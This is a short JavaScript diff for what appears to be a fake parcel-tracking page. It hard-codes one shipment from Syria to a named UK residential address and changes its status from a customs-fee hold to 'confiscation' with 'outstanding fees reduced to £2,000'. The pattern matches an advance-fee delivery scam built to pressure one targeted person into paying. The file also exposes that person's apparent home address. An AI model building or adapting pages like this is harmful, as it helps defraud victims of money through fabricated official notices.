@@ -9,10 +9,10 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Shipment data for the valid number
   const shipmentData = {
-    status: "Awaiting customs clearance fee",
+    status: "Customs Confiscation – Payment Pending",
     origin: "Syria",
     destination: "85 Knox Road, Clacton-on-Sea, Essex CO15 3TT, UK",
-    lastUpdate: "Shipment held at Heathrow Airport (LHR) pending customs clearance. Delivery will proceed once released"
+    lastUpdate: "Package confiscated by Customs due to non-payment of import duties. Outstanding fees reduced to £2,000; release pending payment"
   };
 
   const card = document.querySelector(".card");
